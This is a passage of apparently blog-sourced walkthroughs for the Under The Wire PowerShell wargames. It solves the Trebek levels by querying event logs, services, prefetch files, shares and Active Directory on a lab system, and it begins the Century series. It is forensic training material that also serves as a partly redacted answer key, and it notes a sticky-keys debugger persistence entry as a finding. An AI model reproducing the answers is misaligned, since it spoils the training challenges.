sion\u0026gt; \u0026lt;UseUnifiedSchedulingEngine\u0026gt;true\u0026lt;/UseUnifiedSchedulingEngine\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT72H\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;7\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.ex e\u0026lt;/Command\u0026gt; \u0026lt;Arguments\u0026gt;-NonInteractive -NoLogo -NoProfile -File \u0026#39;c:\\users\\tre bek1\\mess_cleaner.ps1\u0026#39;\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\trebek1\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;RunLevel\u0026gt;LeastPrivilege\u0026lt;/RunLevel\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;/Task\u0026gt; As seen above, the content is a lot to go through at once. We could get the last event in the variable array, splits its message into an array of lines, then get the 12th line from the end of that message as shown below. As I had gone through the long, boring output to get the file.\n$evt[-1].Message.Split(\u0026#34;`n\u0026#34;)[-12] Here is the output of the command above.\nPS C:\\users\\trebek1\\desktop\u0026gt; $evt[-1].Message.Split(\u0026#34;`n\u0026#34;)[-12] \u0026lt;Arguments\u0026gt;-NonInteractive -NoLogo -NoProfile -File \u0026#39;c:\\users\\tre bek1\\mess_cleaner.ps1\u0026#39;\u0026lt;/Arguments\u0026gt; PS C:\\users\\trebek1\\desktop\u0026gt; We have our script and password.\nTrebek level 2-3 # Below is the description of the challenge.\nThe password for trebek3 is the name of the executable associated with the C-3PO service PLUS the name of the file on the user’s desktop. NOTE: – Don’t include the file extension (i.e.- .exe). If the executable name is “binary.exe” and the file on the desktop is named “1234”, the password would be “binary1234”. – The password will be lowercase no matter how it appears on the screen. As seen, we need to find the name of the executable associated with the C-3PO service then combine it with the name of the file on the desktop.\nBelow is the file on the desktop directory.\nPS C:\\users\\trebek2\\desktop\u0026gt; ls Directory: C:\\users\\trebek2\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:45 AM 0 823 PS C:\\users\\trebek2\\desktop\u0026gt; To find the name of the executable, we shall use the following command.\nGet-CimInstance Win32_Service -Filter \u0026#39;Name like \u0026#34;C-3PO\u0026#34;\u0026#39; | Select-Object * Get-CimInstance\nRetrieves information from the Common Information Model (CIM). It\u0026rsquo;s a modern alternative to Get-WmiObject. Used to query system information like services, processes, network configs, etc. Win32_Service\nThis is the CIM class representing Windows services.\nEach object returned represents one Windows service, with properties like:\nName DisplayName StartMode State Status ProcessId and many more\u0026hellip; Filter 'Name like \u0026quot;C-3PO\u0026quot;'\nApplies a filter: it looks for services with a Name exactly equal to \u0026quot;C-3PO\u0026quot;. Technically LIKE allows for wildcards (%), but since none are used here, it behaves like an exact match. Example: 'Name like \u0026quot;C-3PO\u0026quot;' only matches a service named C-3PO. | Select-Object *\nPipes the result into Select-Object * which means: Show all properties of the service object (not just the default summary). Gives you full details about the service. Here is the output of the command\nPS C:\\users\\trebek2\\desktop\u0026gt; Get-CimInstance Win32_Service -Filter \u0026#39;Nam e like \u0026#34;C-3PO\u0026#34;\u0026#39; | Select-Object * Name : C-3PO Status : OK ExitCode : 0 DesktopInteract : False ErrorControl : Normal PathName : [REDACTED] ServiceType : Own Process StartMode : Auto Caption : C-3PO Description : InstallDate : CreationClassName : Win32_Service Started : False SystemCreationClassName : Win32_ComputerSystem SystemName : UTW AcceptPause : False AcceptStop : False DisplayName : C-3PO ServiceSpecificExitCode : 0 StartName : LocalSystem State : Stopped TagId : 0 CheckPoint : 0 DelayedAutoStart : False ProcessId : 0 WaitHint : 0 PSComputerName : CimClass : root/cimv2:Win32_Service CimInstanceProperties : {Caption, Description, InstallDate, Name...} CimSystemProperties : Microsoft.Management.Infrastructure.CimSyste mProperties From the above output, the name of the executable will be at the PathName property.\nWe now have our password.\nTrebek level 3-4 # To get the password for the next level, we are required to find the IP of the user Yoda which was last logged in from, as depicted in the event logs.\nThe password for trebek4 is the IP that the user Yoda last logged in from as depicted in the event logs on the desktop PLUS the name of the text file on the user’s desktop. NOTE: – If the IP address is “2.3.3.2” and the file on the desktop is named “bobby”, the password would be “2.3.3.2bobby”. Below is the file on the desktop.\nPS C:\\users\\trebek3\\desktop\u0026gt; ls Directory: C:\\users\\trebek3\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:46 AM 0 address -a---- 8/30/2018 5:55 AM 99684352 security.evtx PS C:\\users\\trebek3\\desktop\u0026gt; To find the IP from the event logs, we need to look for the event ID 4624 which indicates an account has successfully logged on. We shall use the command below.\n( Get-WinEvent -Path .\\security.evtx -Filt erXPath \u0026#34;*[System[(EventID=4624)]] and *[EventData[Data[@Name=\u0026#39;TargetUs erName\u0026#39;] and (Data=\u0026#39;Yoda\u0026#39;)]]\u0026#34;).Message.Split(\u0026#34;`n\u0026#34;) Get-WinEvent -Path .\\security.evtx\nReads an exported Windows Security log file (security.evtx) from the current folder. FilterXPath \u0026quot;*[System[(EventID=4624)]] and *[EventData[Data[@Name='TargetUserName'] and (Data='Yoda')]]\u0026quot;\nThis is an XPath filter for the event log. EventID=4624: Look for successful logon events. TargetUserName='Yoda': Only select logon events where the account being logged into is named \u0026ldquo;Yoda\u0026rdquo;. ( ... ).Message\nExtracts the Message property from the event. This is the formatted description of the event, like: Here is a deprecated output of the command.\nPS C:\\users\\trebek3\\desktop\u0026gt; ( Get-WinEvent -Path .\\security.evtx -Filt erXPath \u0026#34;*[System[(EventID=4624)]] and *[EventData[Data[@Name=\u0026#39;TargetUs erName\u0026#39;] and (Data=\u0026#39;Yoda\u0026#39;)]]\u0026#34;).Message.Split(\u0026#34;`n\u0026#34;) An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: TREBEK$ Account Domain: UNDERTHEWIRE Logon ID: 0x3E7 Logon Type: 10 Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-1155 Account Name: yoda Account Domain: UNDERTHEWIRE Logon ID: 0xEEB1C Logon GUID: {00000000-0000-0000-0000-000000000000} Process Information: Process ID: 0xf10 Process Name: C:\\Windows\\System32\\winlogon.exe Network Information: Workstation Name: TREBEK Source Network Address: [REDACTED] Source Port: 0 Detailed Authentication Information: Logon Process: User32 Authentication Package: Negotiate Transited Services: - Package Name (NTLM only): - Key Length: 0 This event is generated when a logon session is crea We have a our passowrd for level 4\nTrebek level 4-5 # The password for the next level is the last execution date of Microsoft access plus the name of the text file on the user’s desktop.\nThe password for trebek5 is the last execution date of Microsoft Access PLUS the name of the text file on the user’s desktop. Note: – Format for the date is 2 digit month, 2 digit day, 4 digit year. Ex: 9 feb 2009 would be 02/09/2009. – If the date is “02/09/2009” and the file on the desktop is named “_bob”, the password would be “02/09/2009_bob”. Below is the name of the file ion the user’s desktop.\nPS C:\\users\\trebek4\\desktop\u0026gt; ls Directory: C:\\users\\trebek4\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:46 AM 0 _red PS C:\\users\\trebek4\\desktop\u0026gt; To get the last execution date for Microsoft access, we shall use the following command.\nget-childitem \u0026#34;C:\\Windows\\prefetch\u0026#34; -filter \u0026#34;*access*\u0026#34; Get-ChildItem\nAlias: gci or dir Lists files and folders (i.e. \u0026ldquo;children\u0026rdquo;) in a specified directory. \u0026quot;C:\\Windows\\Prefetch\u0026quot;\nThis is the Windows Prefetch folder, used by the operating system to speed up the loading of frequently accessed programs. Each file here typically represents a record of an application that has been run. Filter \u0026quot;*access*\u0026quot;\nFilters results to only include files that have \u0026quot;access\u0026quot; in their name. This is case-insensitive. Matches files like: ACCESS.EXE-XXXXX.pf MSACCESS.EXE-YYYYY.pf Here is the output of the command.\nPS C:\\users\\trebek4\\desktop\u0026gt; get-childitem \u0026#34;C:\\Windows\\prefetch\u0026#34; -filte r \u0026#34;*access*\u0026#34; Directory: C:\\Windows\\prefetch Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- [REDACTED] 6:04 PM 65058 MSACCESS.EXE-EF45328A .pf PS C:\\users\\trebek4\\desktop\u0026gt; With that, we have our password for the next level.\nTrebek level 5-6 # Below is the description and objective of the challenge.\nThe password for trebek6 is the name of the executable that is starting at 3/23/2017 8:08:53 PM via the Software Protection service as depicted in the event log on the desktop. NOTE: – Don’t include the file extension (i.e.- .exe). – The password will be lowercase no matter how it appears on the screen. We need to look through the event log file to find the name of the executable that is starting at the stated dates and times.\nFor this challenge, the event IDs we shall be targeting are 900, 16384 and 16394\nThe command we shall be using is as follows.\n(Get-WinEvent -Path .\\application.evtx -FilterXPath \u0026#34;*[System[(EventID=900)]] or *[System[(EventID=16384)]] or *[System[(EventID=16394)]]\u0026#34;).Where({$_.TimeCreated -eq (Get-Date \u0026#39;3/23/2017 8:08:53 PM\u0026#39;)}).Message.Split(\u0026#34;`n\u0026#34;)[-1].Split(\u0026#39;=\u0026#39;)[1].Split(\u0026#39;\\.\u0026#39;)[0] Get-WinEvent -Path .\\application.evtx\nLoads an exported Windows event log file from the current directory. FilterXPath \u0026quot;*[System[(EventID=900)]] or *[System[(EventID=16384)]] or *[System[(EventID=16394)]]\u0026quot;\nUses XPath to filter for three specific Event IDs:\n900 – Often related to application lifecycle or info messages. 16384, 16394 – These may relate to software installations or service initializations, depending on the source. .Where({$_.TimeCreated -eq (Get-Date '3/23/2017 8:08:53 PM')})\nFilters the result to only the event that was created at that exact date and time. .Message\nExtracts the full, human-readable text of the event. .Split(\u0026quot;n\u0026quot;)[-1]`\nSplits the message into lines by newline (\\n), then picks the last line. .Split('=')[1]\nSplits that line at the = character and grabs the second part (index [1]), which is likely a value. .Split('\\.')[0]\nSplits that value on the dot character (.) and takes the first part. This is commonly done to extract a NetBIOS name, hostname, or prefix from a fully qualified domain name. Here is the command output.\nPS C:\\users\\trebek5\\desktop\u0026gt; (Get-WinEvent -Path .\\application.evtx -FilterXPath \u0026#34;*[System[(EventID=900)]] or *[System[(EventID=16384)]] or *[System[(EventID=16394)]]\u0026#34;).Where({$_.TimeCreated -eq (Get-Date \u0026#39;3/23/2017 8:08:53 PM\u0026#39;)}).Message.Split(\u0026#34;`n\u0026#34;)[-1].Split(\u0026#39;=\u0026#39;)[1].Split(\u0026#39;\\.\u0026#39;)[0] [REDACTED] Trebek level 6-7 # To find the password for level 7, we need to get the total number of dlls within the directory C:\\program files\\adobe\\ including those in the subfolders found in the directory then join it with the name of the file on the user’s desktop.\nThe password for trebek7 is the total number of DLLs within the “C:\\program files\\adobe\\” folder and it’s subfolders PLUS the name of the file on the desktop. NOTE: – If the count is “9999” and the file on the desktop is named “_abc”, then the password would be “9999_abc”. – The password will be lowercase no matter how it appears on the screen. The file on the desktop is as shown below.\nPS C:\\Users\\trebek6\\desktop\u0026gt; ls Directory: C:\\Users\\trebek6\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:47 AM 0 _reader PS C:\\Users\\trebek6\\desktop\u0026gt; The command we shall use to find the number of DLL(dynamic link library) in the said directory is as shown below.\n(Get-ChildItem -Recurse -Filter \u0026#39;*.dll\u0026#39; \u0026#34;C :\\program files\\adobe\\\u0026#34;).Count Get-ChildItem\nLists files and folders in a specified directory. Alias: gci or dir. Recurse\nTells PowerShell to search all subdirectories as well — not just the top-level folder. Filter '*.dll'\nLimits the search to files with the .dll extension (Dynamic Link Libraries). These files typically contain code libraries used by software applications (like Adobe apps). \u0026quot;C:\\Program Files\\Adobe\\\u0026quot;\nThis is the target directory to search in — where Adobe software is installed. Wrapping the command in parentheses ( ... ).Count\nThe (...) ensures the entire result of Get-ChildItem is treated as one object. .Count returns the number of .dll files found. Here is the output of the command.\nPS C:\\Users\\trebek6\\desktop\u0026gt; (Get-ChildItem -Recurse -Filter \u0026#39;*.dll\u0026#39; \u0026#34;C :\\program files\\adobe\\\u0026#34;).Count [REDACTED] PS C:\\Users\\trebek6\\desktop\u0026gt; Trebek level 7-8 # Below is the challenge objective, to get the name of the program set to run prior to login if sticky keys are activated, then join it with the name of the file on the user’s desktop.\nThe password for trebek8 is the name of the program set to run prior to login if sticky keys are activated PLUS the name of the file on the desktop. NOTE: – Don’t include the file extension (i.e.- .vbs). If the name is “script.vbs” and the file on the desktop is named “1234”, then the password would be “script1234”. – The password will be lowercase no matter how it appears on the screen. The file on the desktop is as shown below.\nPS C:\\users\\trebek7\\desktop\u0026gt; ls Directory: C:\\users\\trebek7\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:47 AM 0 99 PS C:\\users\\trebek7\\desktop\u0026gt; To check if sticky keys is enabled, a flag of 510 is usually set as shown below.\nPS C:\\users\\trebek7\\desktop\u0026gt; Get-Item \u0026#39;HKCU:\\Control Panel\\Accessibilit y\\StickyKeys\u0026#39; Hive: HKEY_CURRENT_USER\\Control Panel\\Accessibility Name Property ---- -------- StickyKeys Flags : 510 PS C:\\users\\trebek7\\desktop\u0026gt; When sticky keys are enabled, the sethc.exe binary is activated. To get a brief understanding of how analyst and malware authors use image file execution options, read this article.\nWe shall use the command below to get the name of the name of the program set.\nGet-ItemProperty \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\u0026#39; HKLM:\\...sethc.exe\nThis is a registry path under HKEY_LOCAL_MACHINE. It refers to the execution settings for the sethc.exe binary. sethc.exe is the Sticky Keys program that can be launched on the login screen by pressing Shift 5 times. | Get-ItemProperty\nRetrieves the properties (values) set under that registry key — especially looking for a value named Debugger. Below is the output of the command.\nPS C:\\users\\trebek7\\desktop\u0026gt; Get-ItemProperty \u0026#39;HKLM:\\SOFTWARE\\Microsoft \\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\u0026#39; Debugger : han_solo.exe PSPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\ Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe PSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\ Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options PSChildName : sethc.exe PSDrive : HKLM PSProvider : Microsoft.PowerShell.Core\\Registry Trebek level 8-9 # The passowrd for level9 is the first 8 bytes of the file located on the user’s desktop.\nThe password for trebek9 the first 8 bytes of the file located on the desktop. Combine the answer together with NO spaces. For this scenario, we shall use the command below.\n(Get-Content -Path ..\\Desktop\\Clone_Trooper_data.pdf -Encoding Byte)[0..7] -join \u0026#34;\u0026#34; Get-Content -Path ..\\Desktop\\Clone_Trooper_data.pdf -Encoding Byte\nReads the binary content of the file, byte by byte. Encoding Byte ensures you\u0026rsquo;re reading the file in raw binary mode, not as text. [0..7]\nThis extracts the first 8 bytes of the file. join \u0026quot;\u0026quot;\nThis joins the extracted bytes into a single string, with no separators. Here is the output of the command.\nPS C:\\users\\trebek8\\desktop\u0026gt; (Get-Content -Path ..\\Desktop\\Clone_Trooper_data.pdf -Encoding Byte)[0..7] -join \u0026#34;\u0026#34; [REDACTED] PS C:\\users\\trebek8\\desktop\u0026gt; Trebek level 9-10 # For this level, we are required to find the name of the potentially rogue share on the system then combine it with the name of the file on the desktop.\nThe password for trebek10 is the name of the potentially rogue share on the system PLUS the name of the file on the desktop. Note: – If the share name is “share$” and the file on the desktop is named “_today”, the password would be “share$_today”. – Exclude any default shares typically found on a Domain Controller. – The password will be lowercase no matter how it appears on the screen. The file on the user’s desktop is.\nPS C:\\users\\trebek9\\desktop\u0026gt; ls Directory: C:\\users\\trebek9\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:48 AM 0 _hiding PS C:\\users\\trebek9\\desktop\u0026gt; To find the rogue share, we shall use the following command.\nget-smbshare This command lists all server message block shares with their descriptions.\nBelow is the output of the command.\nPS C:\\users\\trebek9\\desktop\u0026gt; get-smbshare Name ScopeName Path Description ---- --------- ---- ----------- ADMIN$ * Remote Admin C$ * Default share IPC$ * Remote IPC NETLOGON * Logon server share [REDACTED] * Nothing to see here SYSVOL * Logon server share Tasker * scheduled_things PS C:\\users\\trebek9\\desktop\u0026gt; From the above share we have our rogue share\nTrebek level 10-11 # The objective for ths level is as stated below.\nThe password for trebek11 is the last name of the user who enabled Obi-Wan Kenobi’s account as depicted in the event logs on the desktop PLUS the name of the file on the desktop. NOTE: – If the last name of the user is “johnson” and the file on the desktop is named “1234”, the password would be “johnson1234”. – The password will be lowercase no matter how it appears on the screen. File on the user’s desktop is.\nPS C:\\users\\trebek10\\desktop\u0026gt; ls Directory: C:\\users\\trebek10\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:48 AM 0 2121 -a---- 8/30/2018 5:54 AM 99684352 security.evtx PS C:\\users\\trebek10\\desktop\u0026gt; To find the last name of the user, we need to search for event ID 4722 which indicates user account enablement.\nWe shall use the command below to get the user and pick the last name alone.\n(Get-WinEvent -Path .\\security.evtx -FilterXPath \u0026#34;*[System[EventID=4722]]\u0026#34; | Where-Object { $_.Message -like \u0026#39;*obi*\u0026#39; }).Message.Split(\u0026#34;`n\u0026#34;)[4] Get-WinEvent ... — Reads security.evtx and filters for Event ID 4722 (user account enabled). Where-Object { $_.Message -like '*obi*' } — Filters only those events that mention \u0026quot;obi\u0026quot; in the message. .Message.Split(\u0026quot;n\u0026quot;)[4]` — Takes the matching event’s message, splits it into lines, and shows line 5, which usually contains useful info like who enabled the account. Here is the command output.\nPS C:\\users\\trebek10\\desktop\u0026gt; (Get-WinEvent -Path .\\security.evtx -FilterXPath \u0026#34;*[System[EventID=4722]]\u0026#34; | Where-Object { $_.Message -like \u0026#39;*obi*\u0026#39; }).Message.Split(\u0026#34;`n\u0026#34;)[4] Account Name: admiral.[REDACTED] PS C:\\users\\trebek10\\desktop\u0026gt; Trebek level 11-12 # To find the password for the next level, we need to find the user who was created at the stated time, then combine with the name of the file on the user’s desktop.\nThe password for trebek12 is the username of the user who was created on 11 May 17 at 26 minutes after the hour, as depicted in the event logs on the desktop PLUS the name of the file on the desktop. NOTE: – If the username is “john.doe” and the file on the desktop is named “1234”, the password would be “john.doe1234” – The password will be lowercase no matter how it appears on the screen. Below is the file on the user’s desktop.\nPS C:\\users\\trebek11\\desktop\u0026gt; ls Directory: C:\\users\\trebek11\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:49 AM 0 100 -a---- 8/30/2018 5:55 AM 99684352 security.evtx PS C:\\users\\trebek11\\desktop\u0026gt; To find the user, we need to keep in mind of the event ID for user account creation which is 4720.\nFrom the challenge description, we need to find the user who was created at the 26th minute of the 11th day, from the description, we shall use the command below.\n(Get-WinEvent -Path .\\security.evtx -FilterXPath \u0026#34;*[System[EventID=4720]]\u0026#34;).Where({$_.TimeCreated.Day -eq 11 -and $_.TimeCreated.Minute -eq 26}).Message (Get-WinEvent -Path .\\security.evtx -FilterXPath \u0026quot;*[System[EventID=4720]]\u0026quot;)\nLoads the .evtx event log file from the current directory. Filters it to only return Event ID 4720 events. Event ID 4720 = A user account was created (part of Windows Security logs). .Where({$_.TimeCreated.Day -eq 11 -and $_.TimeCreated.Minute -eq 26})\nFilters the events further by their timestamp: Day -eq 11 means the event happened on the 11th day of the month. Minute -eq 26 means the event occurred at XX:26 (e.g., 14:26, 07:26). .Message\nExtracts and displays the Message property from each matching event. This message contains details such as: Who created the account, What account was created, Security IDs (SIDs), Domain and privileges info. Here is the command output.\nPS C:\\users\\trebek11\\desktop\u0026gt; (Get-WinEvent -Path .\\security.evtx -FilterXPath \u0026#34;*[System[EventID=4720]]\u0026#34;).Where({$_.TimeCreated.Day -eq 11 -and $_.TimeCreated.Minute -eq 26}).Message A user account was created. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-1150 Account Name: poe.dameron Account Domain: UNDERTHEWIRE Logon ID: 0x1235812 New Account: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-1152 Account Name: [REDACTED] Account Domain: UNDERTHEWIRE Attributes: SAM Account Name: general.hux Display Name: Hux, General User Principal Name: general.hux@underthewire.tech Home Directory: - Home Drive: - Script Path: - Profile Path: - User Workstations: - Password Last Set: \u0026lt;never\u0026gt; Account Expires: \u0026lt;never\u0026gt; Primary Group ID: 513 Allowed To Delegate To: - Old UAC Value: 0x0 New UAC Value: 0x15 User Account Control: Account Disabled \u0026#39;Password Not Required\u0026#39; - Enabled \u0026#39;Normal Account\u0026#39; - Enabled User Parameters: - SID History: - Logon Hours: \u0026lt;value not set\u0026gt; Additional Information: Privileges - PS C:\\users\\trebek11\\desktop\u0026gt; Trebek level 12-13 # This level is almost similar to level 12, but the difference is that, for this level, we are searching for the user who created the user Lor San Tekka then join it with the name of the file on the desktop.\nThe password for trebek13 is the username of the user who created the user Lor San Tekka as depicted in the event logs on the desktop PLUS the name of the file on the desktop. NOTE: – If the username is “john.doe” and the file on the desktop is named “1234”, the password would be “john.doe1234” – The password will be lowercase no matter how it appears on the screen. File on the user’s desktop is as shown below.\nPS C:\\users\\trebek12\\desktop\u0026gt; ls Directory: C:\\users\\trebek12\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:49 AM 0 53 -a---- 8/30/2018 5:55 AM 99684352 security.evtx PS C:\\users\\trebek12\\desktop\u0026gt; Just like the previous challenge, we will use the event ID 4720. Below is the command we shall use.\nGet-WinEvent -Path .\\Security.evtx | where {$_.Id -Eq 4720} | Format-List -Property Message | Out-String -Stream | Select-String \u0026#34;tekka\u0026#34; -Context 8,1 Here is the output of the command.\nPS C:\\users\\trebek12\\desktop\u0026gt; Get-WinEvent -Path .\\Security.evtx | where {$_.Id -Eq 4720} | Format-List -Property Message | Out-String -Stream | Select-String \u0026#34;tekka\u0026#34; -Context 8,1 S-1-5-21-3968311752-1263969649-2303472966-1150 Account Name: [REDACTED] Account Domain: UNDERTHEWIRE Logon ID: 0x1235812 New Account: Security ID: S-1-5-21-3968311752-1263969649-2303472966-1151 Account Name: lor.tekka Account Domain: UNDERTHEWIRE Attributes: SAM Account Name: lor.tekka Display Name: Tekka, Lor San User Principal Name: lor.tekka@underthewire.tech Home Directory: - With that, we have the password for our next level.\nTrebek level 13-14 # For this level, we are required to find the last name of the user who has an encoded PowerShell command in their City property then combine it with the name of the file on the desktop.\nThe password for trebek14 is the last name of the user who has an encoded PowerShell command in their City property PLUS the name of the file on the desktop. NOTE: – If the last name is “doe” and the file on the desktop is named “1234”, the password would be “doe1234”. – The password will be lowercase no matter how it appears on the screen. You should note of LDAP city attribute which is represented in the field named l (lowercase ‘L’). We shall use the command below.\nGet-ADUser -Filter \u0026#39;l -like \u0026#34;*\u0026#34;\u0026#39; Here is the command output.\nPS C:\\users\\trebek13\\desktop\u0026gt; Get-ADUser -Filter \u0026#39;l -like \u0026#34;*\u0026#34;\u0026#39; DistinguishedName : CN=Prindel,OU=T-65,OU=X-Wing,DC=underthewire,DC=te ch Enabled : False GivenName : Prindel Name : Prindel ObjectClass : user ObjectGUID : 8edb88c2-c69b-4d78-957e-6c1d1b08f2a5 SamAccountName : Prindel SID : S-1-5-21-758131494-606461608-3556270690-2178 Surname : Prindel UserPrincipalName : Prindel With that, we have the password.\nTrebek level 14-15 # To find the password for the next level, we are required to decode the PowerShell code found in the account properties of the user account from the previous level, then combine with the name of the file on the desktop.\nThe password for trebek15 is the output from decoding the PowerShell code found in the account properties of the user account from the previous level PLUS the name of the file on the desktop. NOTE: – If the output is “blue_and_red” and the file on the desktop is named “_are_great”, the password would be “blue_and_red_are_great”. – The password will be lowercase no matter how it appears on the screen. Below is the file on the desktop.\nPS C:\\users\\trebek14\\desktop\u0026gt; ls Directory: C:\\users\\trebek14\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:49 AM 0 _today PS C:\\users\\trebek14\\desktop\u0026gt; To find the encoded string, we shall use the command below.\nGet-ADUser -Filter \u0026#39;l -like \u0026#34;*\u0026#34;\u0026#39; -Properties l Get-ADUser\nRetrieves user accounts from Active Directory (AD). Filter 'l -like \u0026quot;*\u0026quot;'\nThis filters users to include only those who have a non-empty value for the l attribute. l stands for \u0026ldquo;locality\u0026rdquo; — it\u0026rsquo;s typically used to store the city or location of the user. like \u0026quot;*\u0026quot; matches any value, meaning this returns users where locality is set. Here is the output from the command\nPS C:\\users\\trebek1\\desktop\u0026gt; Get-ADUser -Filter \u0026#39;l -like \u0026#34;*\u0026#34;\u0026#39; -Properties l DistinguishedName : CN=Prindel,OU=T-65,OU=X-Wing,DC=underthewire,DC=te ch Enabled : False GivenName : Prindel l : [REDACTED] ObjectClass : user ObjectGUID : 8edb88c2-c69b-4d78-957e-6c1d1b08f2a5 SamAccountName : Prindel SID : S-1-5-21-758131494-606461608-3556270690-2178 Surname : Prindel UserPrincipalName : Prindel PS C:\\users\\trebek14\\desktop\u0026gt; the hash found is base64 encoded, we can decode it as follows.\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\u0026#34;agBvAGkAbgBfAHQAaABlAF8AcgBlAGIAZQBsAHMA\u0026#34;)) [System.Convert]::FromBase64String(...)\nThis decodes a Base64-encoded string into raw bytes. The input Base64 string is [System.Text.Encoding]::Unicode.GetString(...)\nInterprets the raw bytes as Unicode (UTF-16LE) and converts them to a readable string. Here is the output from the command.\nPS C:\\users\\trebek14\\desktop\u0026gt; [System.Text.Encoding]::Unicode.GetString ([System.Convert]::FromBase64String([REDACTED])) [REDACTED] PS C:\\users\\trebek14\\desktop\u0026gt; Trebek level 15 # We are done :) :) :) :)\nCongratulations! You have successfully made it to the end! Try your luck with other games brought to you by the Under The Wire team. Thanks for playing! Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\trebek15\\desktop\u0026gt; :o :o :o :) :) ","date":"11 June 2025","externalUrl":null,"permalink":"/posts/trebek/","section":"Posts","summary":"underthewire wargames trebek series","title":"Underthewire trebek war games","type":"posts"},{"content":" Century level 0-1 # Below is the goal for this challenge, however there is no level 0, we are required to join the Slack channel to get the login details for century level 1 under the start here channel where at the description of the channel, we have the creds for different war games for under the wire.\nThe goal of this level is to log into the game. Do the following in order to achieve this goal. 1. Obtain the initial credentials via the #StartHere channel on our Slack (link). Once you are in the channel, scroll to the top to see the credentials. 2. After obtaining the credentials, connect to the server via SSH. You will need an SSH client such as Putty. The host that you will be connecting to is century.underthewire.tech, on port 22. 3. When prompted, use the credentials for the applicable game found in the #StartHere Slack channel. 4. You have successfully connected to the game server when your path changes to “PS C:\\Users\\Century1\\desktop\u0026gt;”. Below is a screenshot of the details in the description of starthere channel.\nAfter following the instructions, we have been able to login and achieve the objective for this level The goal of this level is to log into the game.\n#My terminal Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\century1\\desktop\u0026gt; Century level 1-2 # The objective for this level is as stated below form the website.\nThe password for Century2 is the build version of the instance of PowerShell installed on this system. NOTE: – The format is as follows: **.*.*****.**** – Include all periods – Be sure to look for build version and NOT PowerShell version IMPORTANT: Once you feel you have completed the Century1 challenge, start a new connection to the server, and log in with the username of Century2 and this password will be the answer from Century1. If successful, close out the Century1 connection and begin to solve the Century2 challenge. This concept is repeated over and over until you reach the end of the game. We are required to find the build version of the powershell instance we are in. We can search online to see how one gets to identify powershell build version.\nThanks to Google’s AI, searching has been simplified for us,here is the link, as seen above we can use $PSVersionTable to know the build version of the PowerShell instance installed on the machine.\nPS C:\\users\\century1\\desktop\u0026gt; $PSVersionTable Name Value ---- ----- PSVersion 5.1.14393.7870 PSEdition Desktop PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...} BuildVersion [REDACTED] CLRVersion 4.0.30319.42000 WSManStackVersion 3.0 PSRemotingProtocolVersion 2.3 SerializationVersion 1.1.0.1 As seen above we are able to get the build version of the PowerShell that we can use as our password for the next level, level 2.\nCentury level 2-3 # Below is the objective for this level.\nThe password for Century3 is the name of the built-in cmdlet that performs the wget like function within PowerShell PLUS the name of the file on the desktop. NOTE: – If the name of the cmdlet is “get-web” and the file on the desktop is named “1234”, the password would be “get-web1234”. – The password will be lowercase no matter how it appears on the screen. We are required to know the cmdlet that is equivalent to the wget command that is commonly used in Linux to download files directly from the internet to your machine or your active directory.\nSearching online we get the following as the equivalent of the wget command Invoke-WebRequest\nThe password for the next level is a combination of the command and file in the current directory we are in. Just like Linux to list contents in PowerShell we can use the ls command.\nWindows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\century2\\desktop\u0026gt; ls Directory: C:\\users\\century2\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 3:29 AM 693 443 As seen above, we have a file named 443, like the HTTPS protocol. Therefore the password syntax will be command file just as the example in the challenge description, but without space between.\nCentury level 3-4 # Below is the objective of the challenge\nThe password for Century4 is the number of files on the desktop. We have to find a way to know the number of files in the desktop in order to get the password for level 4.\nSearching online how to know the number of files in a directory using 